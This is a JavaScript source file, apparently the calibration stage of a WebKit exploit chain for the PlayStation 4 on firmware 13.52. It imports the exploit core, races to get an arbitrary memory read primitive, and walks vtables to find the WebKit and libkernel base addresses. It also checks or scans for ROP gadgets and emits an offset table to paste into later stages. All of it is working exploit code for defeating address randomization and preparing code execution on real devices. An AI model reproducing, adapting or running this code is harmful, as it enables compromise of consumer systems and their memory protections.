        const hit = hits[hi];
        if (!hit || !hit.vtable) continue;
        for (let i = 0; i < slots; i++) {
            if (yieldEvery > 0 && i > 0 && i % yieldEvery === 0)
                await yieldCal(16);
            const ei = read8p(p, hit.vtable.add32(i * 8));
            if (!ei || (ei.hi < 0x8 && (ei.low >>> 0) < 0x80000000)) continue;
            if (webkitBase && ptrLooksWebkitInterior(ei, webkitBase)) continue;
            const code = read4p(p, ei);
            if (code == null || isBadRead(code) || isWebkitExtCode(code)) continue;
            const hex = ptrHexPad(ei);
            if (seen.has(hex)) continue;
            seen.add(hex);
            out.push({
                label: hit.label + "[" + i + "]",
                ptr: hex,
                hex: hex,
                code: fmtMagic(code),
            });
        }
    }
    return out;
}

function logVtableExtPtrs(p, hit, opts) {
    opts = opts || {};
    const slots = opts.slots != null ? opts.slots : VTABLE_EXT_SLOTS;
    const quiet = !!opts.quiet;
    if (!hit || !hit.vtable) return 0;
    const saved = [];
    let n = 0;
    for (let i = 0; i < slots; i++) {
        const ei = read8p(p, hit.vtable.add32(i * 8));
        if (!ei || (ei.hi < 0x8 && (ei.low >>> 0) < 0x80000000)) continue;
        const code = read4p(p, ei);
        if (isBadRead(code)) continue;
        if (isWebkitExtCode(code >>> 0)) continue;
        const ptrHex = ptrHexPad(ei);
        if (!quiet)
            mark("EXT-PTR", "vtable[" + i + "]=" + ei + " code=" + fmtMagic(code));
        saved.push({ label: "vtable[" + i + "]", ptr: ptrHex, code: fmtMagic(code) });
        n++;
    }
    try {
        if (saved.length)
            sessionStorage.setItem("wk-cal-ext-ptrs", JSON.stringify(saved));
    } catch (_) { }
    return n;
}

function probePsFreeTextareaChain(p, cell, label) {
    const webcore = read8p(p, cell.add32(0x18));
    mark("WEBCORE-PROBE", label + " cell+0x18 m_wrapped="
        + (webcore ? String(webcore) : "read-fail"));
    if (!webcore) return null;

    const vt0 = read8p(p, webcore);
    const e0 = vt0 ? read4p(p, vt0) : null;
    mark("WEBCORE-PROBE", label + " webcore+0 vtable="
        + (vt0 ? String(vt0) : "read-fail") + " entry0=" + fmtMagic(e0));

    if (!vt0 || !plausibleModulePtr(vt0)) return null;
    if (!looksLikeNativeCode(e0) && isBadRead(e0)) return null;

    return {
        label: label + "/psfree+0x18",
        cell,
        implOff: 0x18,
        vtOff: 0,
        webcore,
        vtable: vt0,
        entry0: read8p(p, vt0),
        score: 100,
        walkBack: countWalkMappedPages(p, vt0, VTABLE_WALK_PROBE, true),
    };
}

function findElfBackward(p, startPtr, maxBack, stepSize) {
    const step = stepSize > 0 ? stepSize : CAL_ALIGN_STEP;
    const start = ptrNum(startPtr) & ~(step - 1);
    for (let i = 0; i <= maxBack; i++) {
        const addrNum = start - i * step;
        if (addrNum <= 0x100000) break;
        const b = ptrFromNum(addrNum);
        if (read4p(p, b) === ELF_MAGIC) return b;
    }
    return null;
}

function elfBaseNear(p, hitPage, maxBack) {
    let elf = findElfBackward(p, hitPage, maxBack, CAL_ALIGN_STEP);
    if (elf) return elf;
    return findElfBackward(p, hitPage, Math.min(maxBack * 4, 8192), 0x1000);
}

function ensureElfModuleBase(p, base, maxBack) {
    if (!p || !base) return { base, elf: false, refined: false };
    maxBack = maxBack > 0 ? maxBack : 2048;
    const w0 = read4p(p, base);
    if (w0 === ELF_MAGIC) return { base, elf: true, refined: false };
    const kind = classifyModulePage(p, base);
    const elf = elfBaseNear(p, base, maxBack);
    if (elf) {
        mark("ELF-REFINE", "walk hit " + base + " -> ELF module base " + elf);
        return { base: elf, elf: true, refined: true };
    }
    if (kind === "text" || kind === "data") {
        mark("ELF-INFO", "poops-style base " + base + " (" + kind + " @+0 — OK like chain_poops)");
        return { base, elf: false, refined: false, poopsBase: true, kind };
    }
    if (nativeFn && tableOff && checkGadgetBytes(p, base, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3])) {
        mark("ELF-INFO", "base " + base + " — POP_RDI gadget OK (poops-style base)");
        return { base, elf: false, refined: false, poopsBase: true, kind: "gadget" };
    }
    const extra = [];
    if (nativeFn) extra.push(nativeFn);
    if (vtablePtr) extra.push(vtablePtr);
    for (let i = 0; i < extra.length; i++) {
        const e2 = elfBaseNear(p, extra[i], maxBack);
        if (e2) {
            mark("ELF-REFINE", "via " + extra[i] + " -> ELF base " + e2);
            return { base: e2, elf: true, refined: true, via: extra[i] };
        }
    }
    mark("ELF-MISS-REFINE", "no ELF scan hit at " + base
        + (kind ? " kind=" + kind : "") + " — verify uses poops-style if text/gadget OK");
    return { base, elf: false, refined: false, kind };
}

function resolveModuleBase(p, page, kind) {
    if (kind === "elf") return page;
    if (kind === "text" || kind === "data") return page;
    const elf = elfBaseNear(p, page, 256);
    if (elf) {
        mark("ELF-REFINE", kind + " @ " + page + " -> elf @ " + elf);
        return elf;
    }
    mark("WALK-WARN", kind + " @ " + page + " — no ELF within 2048 pages back, using page");
    return page;
}

function addrFromNumber(n) {
    if (!(n > 0) || !Number.isFinite(n)) return null;
    return ptrFromNum(Math.trunc(n));
}

function loadVtableOverride() {
    try {
        const raw = sessionStorage.getItem(SS_VTABLE_PTR);
        return raw ? parseAddr(raw) : null;
    } catch (_) { return null; }
}

function collectWalkAnchors(p) {
    const out = [];
    const seen = new Set();
    const add = (label, ptr, minWalkBack, force) => {
        if (!ptr || ptr.hi === 0) return;
        const k = ptrNum(ptr);
        if (seen.has(k)) return;
        const walkBack = countWalkMappedPages(p, ptr, 32, true);
        if (!force && walkBack < (minWalkBack == null ? 2 : minWalkBack)) {
            mark("ANCHOR-SKIP", label + " " + ptr + " walkBack=" + walkBack
                + " (too few mapped pages)");
            return;
        }
        seen.add(k);
        out.push({ label, ptr, walkBack, force: !!force });
    };

    vtableHit = null;
    vtablePtr = null;
    const hits = discoverTextareaVtableChains(p, carrierRef);
    for (let hi = 0; hi < hits.length && hi < 6; hi++) {
        const h = hits[hi];
        if (hi === 0) {
            vtableHit = h;
            vtablePtr = h.vtable;
            try { sessionStorage.setItem(SS_VTABLE_PTR, String(h.vtable)); } catch (_) { }
        }
        add("vtable/" + h.label + "+0x" + h.implOff.toString(16), h.vtable, 2);
        if (h.entry0 && h.entry0.hi > 0)
            add("vtable[0]/" + h.label, h.entry0, 1);
        for (let i = 1; i < 4; i++) {
            const ei = read8p(p, h.vtable.add32(i * 8));
            if (ei && looksLikeNativeCode(read4p(p, ei)))
                add("vtable[" + i + "]", ei, 1);
        }
    }

    if (nativeFn && looksLikeNativeCode(read4p(p, nativeFn)))
        add("nativeFn", nativeFn, 0, true);

    return out;
}

async function walkOneAnchor(p, anchor, label) {
    let bad = 0;
    let mapped = 0;
    let lastMagic = null;

    async function tryDir(backward, maxSteps, tag) {
        for (let step = 0; step < maxSteps; step++) {
            const probes = [];
            if (step === 0) probes.push(anchor);
            const page = walkPageFrom(anchor, step, backward);
            if (page) probes.push(page);

            for (let pi = 0; pi < probes.length; pi++) {
                const base = probes[pi];
                const kind = classifyModulePage(p, base);
                const w0 = read4p(p, base);
                if (isBadRead(w0)) bad++;
                else mapped++;
                lastMagic = w0;

                const n = step + 1;
                if (pi === 0 && (n === 1 || n % WALK_LOG_EVERY === 0 || kind)) {
                    mark("VTABLE-FIND", label + " " + tag + " " + n + "/" + maxSteps
                        + " base=" + base + " got=" + fmtMagic(w0)
                        + (kind ? " (" + kind + ")" : ""));
                }
                if (n % 64 === 0 && pi === 0)
                    state(label + " " + tag + " " + n + "/" + maxSteps + "…", "warn");

                if (kind) {
                    const resolved = resolveModuleBase(p, base, kind);
                    mark("MODULE-HIT", label + " " + tag + " kind=" + kind + " base=" + resolved);
                    return resolved;
                }
            }

            if (WALK_YIELD_EVERY > 0 && (step + 1) % WALK_YIELD_EVERY === 0)
                await new Promise(r => setTimeout(r, 0));
        }
        return null;
    }

    mark("WALK-ANCHOR", label + " start=" + anchor);
    let hit = await tryDir(true, FIND_BASE_MAX_STEPS, "back");
    if (hit) return hit;
    hit = await tryDir(false, FIND_FWD_MAX_STEPS, "fwd");
    if (hit) return hit;

    mark("WALK-MISS", label + " unmapped/bad=" + bad + " mapped=" + mapped
        + " last=" + fmtMagic(lastMagic));
    if (bad > mapped && mapped < 8)
        mark("HINT", label + " mostly 0xcccccccc — anchor likely wrong, not WebKit");
    return null;
}

function suggestedExpm1(fn, off) {
    const hint = off && off.wk_expm1_builtin;
    if (!fn || hint == null) return 0;
    const residue = ptrResidue(fn);
    for (let ki = 0; ki < 7; ki++) {
        const k = [-1, 0, 1, -2, 2, -3, 3][ki];
        const d = (hint + k * CAL_ALIGN_STEP) >>> 0;
        if ((d & 0x3fff) === residue) return d;
    }
    return 0;
}

function prefillSuggestedExpm1(fn, off) {
    const guess = ASSUMED_EXPM1 > 0 ? ASSUMED_EXPM1 : suggestedExpm1(fn, off);
    if (!(guess > 0)) return 0;
    if (expm1In) expm1In.value = guess.toString(16);
    mark("CAL-GUESS", "expm1=0x" + guess.toString(16) + " base=" + baseFromDelta(fn, guess)
        + " (assumed — tap Assume to skip verify, or Verify all to check)");
    updateResultPanel();
    return guess;
}

function loadNativeFnOverride() {
    const raw = params.get("nativefn") || sessionStorage.getItem("wk-nativeFn");
    return parseAddr(raw);
}

function tryElfOnce(p, fn, delta) {
    if (!(delta > 0)) return null;
    const base = baseFromDelta(fn, delta);
    if (!base || !alignedWebkitBase(base)) return null;
    const magic = read4p(p, base);
    if (magic !== ELF_MAGIC) return null;
    return { delta, base };
}

function applyBaseFound(base, via) {
    const p = window.p;
    let poopsStyle = false;
    if (p) {
        const refined = ensureElfModuleBase(p, base, 2048);
        base = refined.base;
        poopsStyle = !!refined.poopsBase;
    }
    let delta = nativeFn ? impliedExpm1FromBase(nativeFn, base) : 0;
    try {
        sessionStorage.removeItem(SS_PROBE_I);
        sessionStorage.removeItem(SS_PROBE_LIST);
        sessionStorage.removeItem(SS_FIND_BASE_I);
        sessionStorage.removeItem(SS_VTABLE_FIND_I);
        if (delta > 0) sessionStorage.setItem(SS_CANDIDATE, String(delta));
        sessionStorage.setItem("wk-webkitBase", String(base));
    } catch (_) { }
    manualBase = base;
    try { sessionStorage.setItem(SS_MANUAL_BASE, String(base)); } catch (_) { }
    if (delta > 0 && expm1In) expm1In.value = delta.toString(16);
    if (baseIn) baseIn.value = ptrNum(base).toString(16);
    clearVerifyProgress();
    updateResultPanel();
    const elfPeek = p ? read4p(p, base) : null;
    mark("CAL-ELF-HIT", via + " base=" + base
        + (delta > 0 ? " expm1=0x" + delta.toString(16) : "")
        + (elfPeek === ELF_MAGIC ? " ELF=ok"
            : (poopsStyle ? " poops-base=ok" : " peek=" + fmtMagic(elfPeek))));
}

function applyElfHit(delta, base) {
    applyBaseFound(base, delta > 0 ? "expm1=0x" + delta.toString(16) : "walk");
}

function loadManualBaseOverride() {
    const raw = params.get("base") || sessionStorage.getItem(SS_MANUAL_BASE);
    return parseAddr(raw);
}

function updateResultPanel() {
    if (nativeFnEl) nativeFnEl.textContent = nativeFn ? String(nativeFn) : "—";
    if (baseEl) {
        if (calibrated && calibrated.webkitBase)
            baseEl.textContent = String(calibrated.webkitBase)
                + (manualBase ? " (manual override was used)" : "");
        else if (manualBase)
            baseEl.textContent = String(manualBase) + " (manual)";
        else if (baseIn && baseIn.value.trim()) {
            const typed = parseAddr(baseIn.value);
            baseEl.textContent = typed ? String(typed) + " (typed — tap Set base)" : "—";
        } else if (nativeFn && expm1In && expm1In.value.trim()) {
            const b = baseFromDelta(nativeFn, parseExpm1(expm1In.value));
            baseEl.textContent = b ? String(b) + " (computed)" : "—";
        } else
            baseEl.textContent = "—";
    }
    if (resultEl) {
        if (!calibrated) {
            if (lastGadgetReport) {
                const base = activeBase();
                const delta = activeDelta();
                resultEl.textContent = [
                    "base=" + (base ? String(base) : "?"),
                    delta > 0 ? "expm1=0x" + delta.toString(16) : "",
                    lastGadgetReport,
                ].filter(Boolean).join("\n");
                return;
            }
            resultEl.textContent = "no verified expm1 yet";
            return;
        }
        const elfLine = calibrated.assumed
            ? (calibrated.elf
                ? "ELF peek=ok (assumed path)"
                : "ELF peek=FAIL got="
                    + (calibrated.elfPeek == null ? "read-failed" : fmtMagic(calibrated.elfPeek))
                    + " — base likely wrong")
            : (calibrated.elf ? "ELF=ok" : "ELF=bad");
        resultEl.textContent = [
            (calibrated.assumed ? "ASSUMED (not fully verified)\n" : ""),
            "nativeFn=" + (nativeFn ? String(nativeFn) : "?"),
            "expm1=0x" + calibrated.delta.toString(16),
            "webkit=" + calibrated.webkitBase,
            calibrated.libkernelBase ? "libkernel=" + calibrated.libkernelBase : "libkernel=(IAT not verified)",
            "gadgets=" + calibrated.gadgetOk + "/" + calibrated.gadgetTotal,
            elfLine,
            lastGadgetReport ? "\n" + lastGadgetReport : "",
        ].join("\n");
    }
}

function parseExpm1(str) {
    const s = String(str || "").trim().replace(/^0x/i, "");
    const n = parseInt(s, 16);
    return n > 0 ? n : 0;
}

function checkGadgetBytes(p, base, rva, pat) {
    if (rva == null) return false;
    const a = base.add32(rva);
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        const b = read1p(p, a.add32(i));
        if (b == null || b !== pat[i]) return false;
    }
    return true;
}

function checkOneGadget(p, base, row) {
    const name = row[0];
    const key = row[1];
    const pat = row[2];
    const rva = tableOff[key];
    if (rva == null)
        return { name, key, rva: null, ok: null, line: name + " SKIP (no rva)" };
    if (checkGadgetBytes(p, base, rva, pat))
        return { name, key, rva, ok: true, line: name + " +0x" + rva.toString(16) + " OK" };
    const a = base.add32(rva);
    const got = [];
    for (let bi = 0; bi < pat.length; bi++) {
        if (pat[bi] === null) continue;
        const b = read1p(p, a.add32(bi));
        got.push(b == null ? "?" : b.toString(16));
    }
    return {
        name, key, rva, ok: false,
        line: name + " +0x" + rva.toString(16) + " BAD got=" + got.join(",")
            + " want=" + pat.filter(x => x != null).join(","),
    };
}

function verifyModuleBaseLite(p, startBase) {
    const useBase = startBase;
    const magic = read4p(p, useBase);
    if (magic === ELF_MAGIC)
        return { ok: true, base: useBase, line: "base ELF OK " + useBase };
    const kind = classifyModulePage(p, useBase);
    if (kind === "text" || kind === "data") {
        return {
            ok: true, base: useBase,
            line: "base MODULE OK " + useBase + " kind=" + kind + " peek=" + fmtMagic(magic),
        };
    }
    if (tableOff && tableOff.wk_POP_RDI_RET != null
        && checkGadgetBytes(p, useBase, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3])) {
        return {
            ok: true, base: useBase,
            line: "base GADGET OK " + useBase + " POP_RDI @+"
                + tableOff.wk_POP_RDI_RET.toString(16),
        };
    }
    if (manualBase) {
        return {
            ok: true, base: useBase,
            line: "base MANUAL OK " + useBase + " peek=" + fmtMagic(magic),
        };
    }
    return {
        ok: false, base: useBase,
        line: "base FAIL " + useBase + " got=" + fmtMagic(magic),
    };
}

function verifyModuleBaseOnce(p, startBase) {
    let useBase = startBase;
    let magic = read4p(p, useBase);
    const refined = ensureElfModuleBase(p, useBase, 2048);
    useBase = refined.base;
    magic = read4p(p, useBase);
    if (ptrNum(useBase) !== ptrNum(startBase)) {
        manualBase = useBase;
        try { sessionStorage.setItem(SS_MANUAL_BASE, String(useBase)); } catch (_) { }
        if (baseIn) baseIn.value = ptrNum(useBase).toString(16);
        const nd = nativeFn ? impliedExpm1FromBase(nativeFn, useBase) : 0;
        if (nd > 0 && expm1In) expm1In.value = nd.toString(16);
        updateResultPanel();
    }
    if (magic === ELF_MAGIC)
        return { ok: true, base: useBase, line: "base ELF OK " + useBase };
    const kind = classifyModulePage(p, useBase);
    if (kind === "text" || kind === "data" || refined.poopsBase)
        return {
            ok: true, base: useBase,
            line: "base MODULE OK " + useBase + " kind=" + (kind || refined.kind || "gadget")
                + " peek=" + fmtMagic(magic),
        };
    if (tableOff && checkGadgetBytes(p, useBase, tableOff.wk_POP_RDI_RET, [0x5f, 0xc3]))
        return {
            ok: true, base: useBase,
            line: "base GADGET OK " + useBase + " POP_RDI @+"
                + tableOff.wk_POP_RDI_RET.toString(16),
        };
    return {
        ok: false, base: useBase,
        line: "base FAIL " + useBase + " got=" + fmtMagic(magic),
    };
}

function verifyLibkernelOnce(p, base) {
    if (!tableOff.wk___imp___error || !tableOff.k__error)
        return { ok: null, lkBase: null, line: "libkernel SKIP (no IAT offsets)" };
    const errorFn = read8p(p, base.add32(tableOff.wk___imp___error));
    if (!errorFn)
        return { ok: false, lkBase: null, line: "libkernel IAT-FAIL @+"
            + tableOff.wk___imp___error.toString(16) };
    const lk = errorFn.sub32(tableOff.k__error);
    const w0 = read4p(p, lk);
    const w1 = read4p(p, lk.add32(4));
    if (w1 != null && (w0 & 0xff) === 0xb8 && (w1 & 0xffff) === 0x050f)
        return { ok: true, lkBase: lk, line: "libkernel OK " + lk };
    return { ok: false, lkBase: null, line: "libkernel BAD prologue @ " + lk
        + " w0=" + fmtMagic(w0) + " w1=" + fmtMagic(w1) };
}

function bytesFromRead8(w) {
    const out = [];
    let v = w.low >>> 0;
    for (let i = 0; i < 4; i++) {
        out.push(v & 0xff);
        v >>>= 8;
    }
    v = w.hi >>> 0;
    for (let i = 0; i < 4; i++) {
        out.push(v & 0xff);
        v >>>= 8;
    }
    return out;
}

function matchPatAt(bytes, startOff, pat) {
    for (let pi = 0; pi < pat.length; pi++) {
        if (pat[pi] === null) continue;
        const bi = startOff + pi;
        if (bi >= bytes.length) return false;
        if (bytes[bi] !== pat[pi]) return false;
    }
    return true;
}

function findPatInRead8(bytes, pat) {
    for (let start = 0; start < 8; start++) {
        if (matchPatAt(bytes, start, pat)) return start;
    }
    return -1;
}

function pickBestGadgetMatch(hits, hintRva) {
    if (!hits || hits.length === 0) return null;
    if (!(hintRva > 0)) return hits[0];
    let best = hits[0];
    let bestDist = Math.abs(best - hintRva);
    for (let i = 1; i < hits.length; i++) {
        const d = Math.abs(hits[i] - hintRva);
        if (d < bestDist) {
            best = hits[i];
            bestDist = d;
        }
    }
    return best;
}

function clearGadgetScanState() {
    try { sessionStorage.removeItem(SS_GSCAN); } catch (_) { }
}

function tryBakedGadgets(p, base) {
    if (!tableOff) return null;
    const found = {};
    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
        const row = GADGET_CHECKS[gi];
        const key = row[1];
        const rva = tableOff[key];
        if (rva == null || !checkGadgetBytes(p, base, rva, row[2]))
            return null;
        found[key] = rva;
    }
    return found;
}

function loadGadgetScanState(base) {
    try {
        const raw = sessionStorage.getItem(SS_GSCAN);
        if (!raw) return null;
        const st = JSON.parse(raw);
        if (!st || String(st.base) !== String(base)) return null;
        return st;
    } catch (_) { return null; }
}

function saveGadgetScanState(st) {
    try { sessionStorage.setItem(SS_GSCAN, JSON.stringify(st)); } catch (_) { }
}

function scanRangeForRow(row) {
    const key = row[1];
    const hint = tableOff && tableOff[key] != null ? tableOff[key] : 0;
    if (hint > 0) {
        return {
            minRva: Math.max(SCAN_GADGET_MIN, hint - SCAN_NEAR_RADIUS),
            maxRva: Math.min(SCAN_GADGET_MAX, hint + SCAN_NEAR_RADIUS),
        };
    }
    return { minRva: SCAN_GADGET_MIN, maxRva: SCAN_GADGET_MIN + SCAN_NEAR_RADIUS * 2 };
}

async function scanGadgetChunk(p, base, row, minRva, maxRva, cursor, maxSteps) {
    const pat = row[2];
    const hint = tableOff && tableOff[row[1]] != null ? tableOff[row[1]] : 0;
    let rva = cursor != null ? cursor : (minRva & ~7);
    let steps = 0;
    let hit = null;
    while (rva < maxRva && steps < maxSteps) {
        const w = read8p(p, base.add32(rva));
        if (w) {
            const off = findPatInRead8(bytesFromRead8(w), pat);
            if (off >= 0) {
                const cand = rva + off;
                if (hit == null || Math.abs(cand - hint) < Math.abs(hit - hint))
                    hit = cand;
            }
        }
        rva += 8;
        steps++;
        if ((steps & 0xff) === 0)
            await new Promise(r => setTimeout(r, 0));
    }
    return { cursor: rva, hit, done: rva >= maxRva };
}

function applyScannedGadgets(found, reportLines) {
    if (!tableOff) return;
    tableOff = Object.assign({}, tableOff, found);
    try { sessionStorage.setItem("wk-scanned-gadgets", JSON.stringify(found)); } catch (_) { }
    const lines = reportLines || [];
    lines.push("--- scanned RVAs ---");
    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
        const key = GADGET_CHECKS[gi][1];
        const name = GADGET_CHECKS[gi][0];
        const rva = found[key];
        lines.push(name + " +0x" + (rva != null ? rva.toString(16) : "MISS"));
    }
    const jsonParts = {};
    for (const key of Object.keys(found))
        jsonParts[key] = "0x" + found[key].toString(16);
    lines.push("json " + JSON.stringify(jsonParts));
    markGadgetReport(lines);
    clearVerifyProgress();
    const delta = activeDelta();
    const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, activeBase());
    if (useDelta > 0 && Object.keys(found).length >= GADGET_CHECKS.length) {
        applyCalibration(useDelta, activeBase(), null, GADGET_CHECKS.length, { fromScan: true });
        mark("CAL-OK", "scan saved offsets — no Verify all needed");
    } else {
        mark("HINT", "scan done — or tap Verify all (lite, ~25 reads)");
    }
}

function applyAcceptedOffsets(base, delta) {
    if (!tableOff) return;
    const report = [
        "build=" + BUILD_ID + " (accept 0 reads)",
        "base=" + base + " expm1=0x" + delta.toString(16),
        "--- gadgets (13.52 table) ---",
    ];
    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
        const row = GADGET_CHECKS[gi];
        const rva = tableOff[row[1]];
        report.push(row[0] + " +0x" + (rva != null ? rva.toString(16) : "?"));
    }
    report.push("summary 8/8 table (not re-read on HW)");
    const jsonParts = {};
    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
        const key = GADGET_CHECKS[gi][1];
        if (tableOff[key] != null)
            jsonParts[key] = "0x" + tableOff[key].toString(16);
    }
    report.push("json " + JSON.stringify(jsonParts));
    markGadgetReport(report);
    applyCalibration(delta, base, null, GADGET_CHECKS.length, { accept: true, fromScan: true });
}

async function runAcceptOffsets() {
    if (busy || !ready) return;
    const base = activeBase();
    const delta = activeDelta();
    if (!base) {
        mark("CAL-FAIL", "no base — Set base first");
        state("need base", "bad");
        return;
    }
    if (!(delta > 0)) {
        mark("CAL-FAIL", "no expm1 — Set expm1 eb6350");
        state("need expm1", "bad");
        return;
    }
    busy = true;
    setUi();
    try {
        await freeCalMemory();
        applyAcceptedOffsets(base, delta);
        state("offsets accepted — Copy JSON", "ok");
    } finally {
        busy = false;
        setUi();
    }
}

/** legacy name — scan OOMs on PS4; accept uses baked table (0 reads) */
async function runScanGadgets() {
    return runAcceptOffsets();
}

function applyCalibration(delta, base, libkernelBase, gadgetOk, opts) {
    const assumed = opts && opts.assumed;
    const fromScan = opts && opts.fromScan;
    const accept = opts && opts.accept;
    const useDelta = delta > 0 ? delta : impliedExpm1FromBase(nativeFn, base);
    if (!(useDelta > 0)) {
        mark("CAL-FAIL", "no expm1 delta for PASTE-OFFSETS");
        return;
    }
    const result = {
        delta: useDelta,
        webkitBase: base,
        libkernelBase: libkernelBase || null,
        elf: accept ? false : (assumed ? (opts.elfPeek === ELF_MAGIC) : !!fromScan),
        elfPeek: accept ? null : (assumed ? opts.elfPeek
            : (fromScan && window.p ? read4p(window.p, base) : ELF_MAGIC)),
        gadgetOk: gadgetOk || 0,
        gadgetTotal: GADGET_CHECKS.length,
        ok: true,
        assumed: !!assumed,
        fromScan: !!fromScan,
        accept: !!accept,
    };
    calibrated = result;
    clearVerifyProgress();
    clearLkProgress();
    const live = {
        fw_status: accept
            ? "13.52 HW — accepted table (0 reads)"
            : fromScan
                ? "13.52 HW — expm1 + pop gadgets from scan"
                : assumed
                    ? "assumed expm1 on hardware — not ELF/gadget verified"
                    : "calibrated on hardware (index_cal.html)",
        wk_JSFunction_m_function: tableOff.wk_JSFunction_m_function || 0x28,
        wk_expm1_builtin: result.delta,
        wk_ArrayBuffer_m_impl: tableOff.wk_ArrayBuffer_m_impl,
        wk_ArrayBuffer_m_contents_m_data: tableOff.wk_ArrayBuffer_m_contents_m_data,
    };
    if (tableOff.wk___imp___error) live.wk___imp___error = tableOff.wk___imp___error;
    if (tableOff.k__error) live.k__error = tableOff.k__error;
    for (let gi = 0; gi < GADGET_CHECKS.length; gi++) {
        const key = GADGET_CHECKS[gi][1];
        if (tableOff[key] != null) live[key] = tableOff[key];
    }

    try {
        sessionStorage.setItem("wk-calibrated", JSON.stringify(live));
        sessionStorage.setItem("wk-webkitBase", String(result.webkitBase));
        sessionStorage.removeItem("wk-cal-lite-i");
        sessionStorage.removeItem("wk-cal-wide-i");
    } catch (_) { }

    mark("CAL-OK", (accept ? "ACCEPT " : assumed ? "ASSUMED " : "")
        + "expm1=0x" + result.delta.toString(16) + " base=" + result.webkitBase);
    mark("BASES", "webkit=" + result.webkitBase
        + (result.libkernelBase ? " libkernel=" + result.libkernelBase : ""));
    mark("PASTE-OFFSETS", JSON.stringify(live));
    if (expm1In) expm1In.value = result.delta.toString(16);
    updateResultPanel();
    state("CAL-OK — expm1 verified", "ok");
    setUi();
}

function rebuildScanList(mode) {
    scanMode = mode;
    if (mode === "lite") scanList = liteHintDeltas(tableOff, nativeFn);
    else scanList = wideAlignedDeltas(nativeFn);
    const key = mode === "lite" ? "wk-cal-lite-i" : "wk-cal-wide-i";
    try { scanIndex = parseInt(sessionStorage.getItem(key) || "0", 10) || 0; }
    catch (_) { scanIndex = 0; }
    mark("SCAN-LIST", mode + " candidates=" + scanList.length + " next=" + (scanIndex + 1));
    if (scanList.length > 0 && scanIndex < 5) {
        mark("SCAN-PEEK", scanList.slice(scanIndex, scanIndex + 5)
            .map(d => "0x" + d.toString(16)).join(" "));
    }
}

function logNativeFnInfo(fn) {
    const residue = ptrResidue(fn);
    mark("CAL-NATIVEFN", String(fn) + " (ptr=0x" + ptrNum(fn).toString(16) + ")");
    mark("CAL-RESIDUE", "ptr&0x3fff=0x" + residue.toString(16));
    mark("CAL-FORMULA", "webkitBase = nativeFn - expm1");
    const code0 = window.p ? read4p(window.p, fn) : null;
    mark("CAL-CODE0", "read4@nativeFn=" + fmtMagic(code0) + " (sanity — not ELF)");
    if (tableOff && tableOff.wk_expm1_builtin != null) {
        const hint = tableOff.wk_expm1_builtin;
        const hintBase = baseFromDelta(fn, hint);
        mark("CAL-HINT", "table expm1=0x" + hint.toString(16)
            + " → base=" + hintBase + (hintBase && alignedWebkitBase(hintBase) ? "" : " (misaligned)"));
    }
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = { establishPrimitive: core.establishPrimitive, installWindowP };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom above, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    raceBuf.length = 0;
    raceMode = true;
    const cap = attemptCap();
    mark("ATTEMPTS", cap > 0 ? String(cap) + " per page load" : "unlimited (single run)");
    mark("NOTE", "close browser fully before Start if prior OOM or long retry session");
    try {
        return await establishPrimitive({
            maxAttempts: cap,
            skipTrimDebris: true,
            onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } finally {
        raceMode = false;
        for (let i = 0; i < raceBuf.length; i++) {
            const line = raceBuf[i];
            const tag = line.split(/\s/)[0];
            if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|PRIMITIVE|PAIR|HINT/i.test(tag)) {
                let dup = false;
                for (let j = 0; j < lines.length; j++) {
                    if (lines[j] === line) { dup = true; break; }
                }
                if (!dup) lines.push(line);
            }
        }
        crashLog.appendMany(raceBuf);
        raceBuf.length = 0;
        if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
        crashLog.flushSync();
        renderOut();
    }
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    crashLog.sessionMarker("START");
    calibrated = null;
    clearGadgetScanState();

    const detected = offsetsFor(navigator.userAgent);
    tableOff = merge1352Table((offsetsForKey(detected.key || "13.52").off)
        || offsetsForKey("13.52").off);
    if (params.get("restorescan") === "1") {
        try {
            const scanned = sessionStorage.getItem("wk-scanned-gadgets");
            if (scanned) {
                tableOff = Object.assign({}, tableOff, JSON.parse(scanned));
                mark("BOOT", "restored scanned gadget RVAs from session");
            }
        } catch (_) { }
    }
    mark("UA-FW", detected.key || "unknown");
    mark("GOAL", "find wk_expm1_builtin for 13.52 retail");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }
        installP(carrier, { promote: params.get("promote") === "1" });
        carrierRef = carrier;
        vtablePtr = null;
        vtableHit = null;
        const p = window.p;
        if (!p) throw new Error("window.p missing");

        mark("PRIMITIVE-OK", "");
        mark("PAIR-STATUS", "state=" + pairStatus.state);

